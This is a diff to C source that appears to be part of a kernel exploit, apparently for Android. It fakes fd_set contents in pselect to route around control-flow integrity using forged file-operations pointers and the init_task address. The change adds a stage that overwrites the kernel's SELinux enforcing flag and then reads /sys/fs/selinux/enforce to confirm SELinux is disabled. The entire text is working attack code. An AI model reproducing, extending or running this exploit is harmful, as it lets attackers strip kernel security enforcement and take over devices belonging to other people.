@@ -6,6 +6,7 @@
 #define PSELECT_CFI_ROUTE_ATTEMPTS 1
 #endif
 
+int fops_selinux_prestage;
 atomic_int cfi_stage_done;
 ssize_t cfi_write_ret = -1;
 ssize_t cfi_read_ret = -1;
@@ -91,12 +92,25 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   fdset_put_word(in, 1, 0);
   fdset_put_word(in, 2, 0);
   fdset_put_word(in, 3, 0);
-  fdset_put_word(out, 2, fake_fops);
-  fdset_put_word(out, 3, data_addr(ASHMEM_MISC_FOPS));
+  if (fops_selinux_prestage) {
+    fdset_put_word(out, 2, data_addr(SELINUX_ENFORCING) - 8);
+    fdset_put_word(out, 3, 0);
+  } else {
+    fdset_put_word(out, 2, fake_fops);
+    fdset_put_word(out, 3, data_addr(ASHMEM_MISC_FOPS));
+  }
   fdset_put_word(ex, 0, text_addr(INIT_TASK));
   fdset_put_word(ex, 1, fake_lock);
   fdset_put_word(ex, 2, 140);
   fdset_put_word(ex, 3, 0);
+}
+
+int verify_selinux_disabled(void) {
+  char buf[16] = {0};
+  read_first_line("/sys/fs/selinux/enforce", buf, sizeof(buf));
+  int enforcing = atoi(buf);
+  pr_info("selinux verify enforcing=%d raw='%s'\n", enforcing, buf);
+  return enforcing == 0;
 }
 
 void do_pselect_fake_lock_route(void) {
@@ -167,11 +181,21 @@ void do_pselect_fake_lock_route(void) {
 
     int route_signal = calls > 0 && success > 0;
     if (route_signal) {
-      if (try_cfi_stage()) {
-        cfi_last_step = 0;
-        route_verified = 1;
-      } else if (!cfi_last_step) {
-        cfi_last_step = 32;
+      if (fops_selinux_prestage) {
+        if (verify_selinux_disabled()) {
+          cfi_last_step = 0;
+          route_verified = 1;
+        } else {
+          cfi_last_step = 36;
+          cfi_last_errno = 0;
+        }
+      } else {
+        if (try_cfi_stage()) {
+          cfi_last_step = 0;
+          route_verified = 1;
+        } else if (!cfi_last_step) {
+          cfi_last_step = 32;
+        }
       }
     } else if (!route_verified) {
       cfi_last_step = 33;
